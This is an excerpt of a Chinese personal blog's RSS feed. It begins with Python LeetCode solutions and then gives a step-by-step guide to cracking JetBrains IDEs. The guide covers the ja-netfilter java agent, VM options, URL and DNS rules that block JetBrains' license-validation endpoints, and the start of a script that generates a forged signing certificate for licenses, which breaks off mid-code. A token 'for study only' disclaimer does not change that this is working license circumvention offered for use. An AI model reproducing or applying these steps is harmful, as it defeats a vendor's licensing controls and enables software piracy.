&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; flag[(j &lt;span style="color:#f92672"&gt;//&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;&lt;span style="color:#f92672"&gt;**&lt;/span&gt;i) &lt;span style="color:#f92672"&gt;%&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;] &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# print(flag)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; m &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(&lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; flag[m] &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; n &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(m&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; flag[n] &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; res &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; flag[m]&lt;span style="color:#f92672"&gt;*&lt;/span&gt;flag[n]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; res
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;官方题解差不多，它是都乘结果除以2。&lt;/p&gt;
&lt;h2 id="3127-构造相同颜色的正方形"&gt;3127. 构造相同颜色的正方形
&lt;/h2&gt;&lt;p&gt;题解：遍历格子的右、右下、下。统计相同颜色超过3个就返回 &lt;code&gt;True&lt;/code&gt;。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; j &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; flag &lt;span style="color:#f92672"&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; flag&lt;span style="color:#f92672"&gt;.&lt;/span&gt;append(grid[i][j])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; flag&lt;span style="color:#f92672"&gt;.&lt;/span&gt;append(grid[i&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;][j])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; flag&lt;span style="color:#f92672"&gt;.&lt;/span&gt;append(grid[i][j&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; flag&lt;span style="color:#f92672"&gt;.&lt;/span&gt;append(grid[i&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;][j&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;from&lt;/span&gt; collections &lt;span style="color:#f92672"&gt;import&lt;/span&gt; Counter
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; cnt &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Counter(flag)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; value &lt;span style="color:#f92672"&gt;in&lt;/span&gt; cnt&lt;span style="color:#f92672"&gt;.&lt;/span&gt;values():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; value &lt;span style="color:#f92672"&gt;&amp;gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;3&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="2024-考试的最大困扰度"&gt;2024. 考试的最大困扰度
&lt;/h2&gt;&lt;p&gt;题解：就是判断最大连续的字符数，但是可以修改字符使其更长。使用滑动窗口。以 &lt;code&gt;T&lt;/code&gt; 为例，&lt;code&gt;left&lt;/code&gt; 和 &lt;code&gt;right&lt;/code&gt; 记录最长的区间，&lt;code&gt;sum&lt;/code&gt; 记录为 &lt;code&gt;F&lt;/code&gt; 的区间长度。&lt;code&gt;right&lt;/code&gt; 往右移，遇 &lt;code&gt;T&lt;/code&gt; 不增加 &lt;code&gt;F&lt;/code&gt; 增加 &lt;code&gt;sum&lt;/code&gt;，如果 &lt;code&gt;sum&lt;/code&gt; 大于 &lt;code&gt;k&lt;/code&gt;，则左区间也往右移清零，&lt;code&gt;ans&lt;/code&gt; 记录最大值答案。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Solution&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;maxConsecutiveAnswers&lt;/span&gt;(self, answerKey, k):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type answerKey: str
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type k: int
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :rtype: int
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;maxCont&lt;/span&gt;(ch):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; left,ans,sum&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; right &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(len(answerKey)):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sum &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; answerKey[right] &lt;span style="color:#f92672"&gt;!=&lt;/span&gt; ch
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;while&lt;/span&gt; sum &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; k:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sum &lt;span style="color:#f92672"&gt;-=&lt;/span&gt; answerKey[left] &lt;span style="color:#f92672"&gt;!=&lt;/span&gt; ch
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; left &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ans &lt;span style="color:#f92672"&gt;=&lt;/span&gt; max(ans,right&lt;span style="color:#f92672"&gt;-&lt;/span&gt;left&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; ans
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; max(maxCont(&lt;span style="color:#e6db74"&gt;&amp;#39;T&amp;#39;&lt;/span&gt;),maxCont(&lt;span style="color:#e6db74"&gt;&amp;#39;F&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;同&lt;a class="link" href="https://leetcode.cn/problems/max-consecutive-ones-iii/" target="_blank" rel="noopener"
&gt;1004. 最大连续1的个数 III&lt;/a&gt;&lt;/p&gt;
&lt;h2 id="2708-一个小组的最大实力值"&gt;2708. 一个小组的最大实力值
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Solution&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;maxStrength&lt;/span&gt;(self, nums):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type nums: List[int]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :rtype: int
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; nums &lt;span style="color:#f92672"&gt;=&lt;/span&gt; sorted(nums)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; len(nums) &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; nums[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; len(nums) &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ans &lt;span style="color:#f92672"&gt;=&lt;/span&gt; nums[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;] &lt;span style="color:#f92672"&gt;*&lt;/span&gt; nums[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; ans &lt;span style="color:#f92672"&gt;&amp;lt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; max(nums)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; ans
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; pos_cnt, zero_cnt, neg_cnt &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ans &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; max_nav &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(len(nums)):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; nums[i] &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; zero_cnt &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; nums[i] &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; pos_cnt &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; max_nav &lt;span style="color:#f92672"&gt;=&lt;/span&gt; max(max_nav, nums[i])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; neg_cnt &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ans &lt;span style="color:#f92672"&gt;*=&lt;/span&gt; nums[i]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; pos_cnt &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; neg_cnt &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; &lt;span style="color:#f92672"&gt;or&lt;/span&gt; neg_cnt &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; ans &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ans &lt;span style="color:#f92672"&gt;=&lt;/span&gt; ans &lt;span style="color:#f92672"&gt;//&lt;/span&gt; max_nav
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; ans
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;题解：分类讨论，&lt;del&gt;我要气晕了&lt;/del&gt;。感觉代码里我考虑情况重复了。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;仅有一个数，直接返回。&lt;/li&gt;
&lt;li&gt;数组中小于等于1个负数，其他都是0，在 &lt;code&gt;ans // max_nav&lt;/code&gt; 时要注意最大值是0。&lt;/li&gt;
&lt;li&gt;其他情况，非零数全乘，如果值为正返回，如果值为负，除以最大的非零负数 &lt;code&gt;max_nav&lt;/code&gt;就是答案。&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>JetBrains 全家桶破解</title><link>https://www.braindance.top/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/</link><pubDate>Wed, 30 Aug 2023 00:00:00 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/</guid><description>&lt;p&gt;&lt;del&gt;突然想开发了我的 IDEA 还是 2021 的，IDEA 和 Pycharm 还在机械硬盘，装个最新的到固态里面。教育邮箱懒得申请了，失效了又要麻烦续杯。写出来记录一下以后自己参考。&lt;/del&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;所提供的内容仅供学习交流使用,严禁用于商业用途,请于下载后24小时内删除。&lt;/p&gt;&lt;/blockquote&gt;
&lt;h2 id="准备"&gt;准备
&lt;/h2&gt;&lt;p&gt;破解使用的是 &lt;a class="link" href="https://gitee.com/ja-netfilter/ja-netfilter" target="_blank" rel="noopener"
&gt;ja-netfilter&lt;/a&gt;：https://gitee.com/ja-netfilter/ja-netfilter。release 下载以后解压。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2023/10/07/6520f05f102ea.png"
loading="lazy"
alt="1696657544950.png"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;config&lt;/code&gt; 配置文件默认为空，需要添加一些配置。plugins 是可以加载一些其他联动插件，本文使用的方法不用其他插件。&lt;/p&gt;
&lt;p&gt;找到 IDEA 或者 Pycharm 的 &lt;code&gt;Help&lt;/code&gt; &amp;mdash;&amp;gt; &lt;code&gt;Edit Custom VM Options&lt;/code&gt; 添加启动参数，路径是&lt;code&gt;ja-netfilter&lt;/code&gt;的 jar 包路径。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;-javaagent:C:\\path\\to\\ja-netfilter.jar
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Jetbrain全家桶在2022.2版本以上默认启用Java17&lt;/strong&gt;，所以用的时候需要在 VM Options 里额外增加下面两行参数。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED
--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在这里修改的 VM Options 配置文件路径是 C 盘下的本版本全局配置，也可以修改添加到安装目录下的 bin 目录中的 &lt;code&gt;idea64.exe.vmoptions&lt;/code&gt; 配置文件。&lt;/p&gt;
&lt;h2 id="修改其他配置"&gt;修改其他配置
&lt;/h2&gt;&lt;p&gt;修改 &lt;code&gt;config&lt;/code&gt; 修改文件夹下的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;congig/url.conf&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;[URL]
PREFIX,https://account.jetbrains.com/lservice/rpc/validateKey.action
PREFIX,https://account.jetbrains.com.cn/lservice/rpc/validateKey.action
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;congig/dns.conf&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;[DNS]
EQUAL,jetbrains.com
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="激活"&gt;激活
&lt;/h2&gt;&lt;h3 id="使用-power-插件"&gt;使用 power 插件
&lt;/h3&gt;&lt;p&gt;power 插件被作者成为非对称加密的屠龙刀，这种方式激活可以自定义信息，并且可以设置全家桶激活。&lt;/p&gt;
&lt;p&gt;参考大佬&lt;a class="link" href="https://xuzhengtong.com/2022/07/25/ja-netfilter/ja-netfilter-plugins-power/" target="_blank" rel="noopener"
&gt;博客文章&lt;/a&gt; 本地运行两个 python 文件，一个用于生成本地证书签名文件&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; datetime
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; cryptography &lt;span style="color:#f92672"&gt;import&lt;/span&gt; x509
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; cryptography.hazmat.backends &lt;span style="color:#f92672"&gt;import&lt;/span&gt; default_backend
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; cryptography.hazmat.primitives &lt;span style="color:#f92672"&gt;import&lt;/span&gt; hashes, serialization
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; cryptography.hazmat.primitives.asymmetric &lt;span style="color:#f92672"&gt;import&lt;/span&gt; rsa
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; cryptography.x509.oid &lt;span style="color:#f92672"&gt;import&lt;/span&gt; NameOID
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;one_day &lt;span style="color:#f92672"&gt;=&lt;/span&gt; datetime&lt;span style="color:#f92672"&gt;.&lt;/span&gt;timedelta(days&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ten_day &lt;span style="color:#f92672"&gt;=&lt;/span&gt; datetime&lt;span style="color:#f92672"&gt;.&lt;/span&gt;timedelta(days&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;3650&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;today &lt;span style="color:#f92672"&gt;=&lt;/span&gt; datetime&lt;span style="color:#f92672"&gt;.&lt;/span&gt;datetime&lt;span style="color:#f92672"&gt;.&lt;/span&gt;today()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;yesterday &lt;span style="color:#f92672"&gt;=&lt;/span&gt; today &lt;span style="color:#f92672"&gt;-&lt;/span&gt; one_day
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;tomorrow &lt;span style="color:#f92672"&gt;=&lt;/span&gt; today &lt;span style="color:#f92672"&gt;+&lt;/span&gt; ten_day
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;private_key &lt;span style="color:#f92672"&gt;=&lt;/span&gt; rsa&lt;span style="color:#f92672"&gt;.&lt;/span&gt;generate_private_key(
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; public_exponent&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;65537&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; key_size&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;4096&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; backend&lt;span style="color:#f92672"&gt;=&lt;/span&gt;default_backend()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;public_key &lt;span style="color:#f92672"&gt;=&lt;/span&gt; private_key&lt;span style="color:#f92672"&gt;.&lt;/span&gt;public_key()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;builder &lt;span style="color:#f92672"&gt;=&lt;/span&gt; x509&lt;span style="color:#f92672"&gt;.&lt;/span&gt;CertificateBuilder()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;builder &lt;span style="color:#f92672"&gt;=&lt;/span&gt; builder&lt;span style="color:#f92672"&gt;.&lt;/span&gt;subject_name(x509&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Name([
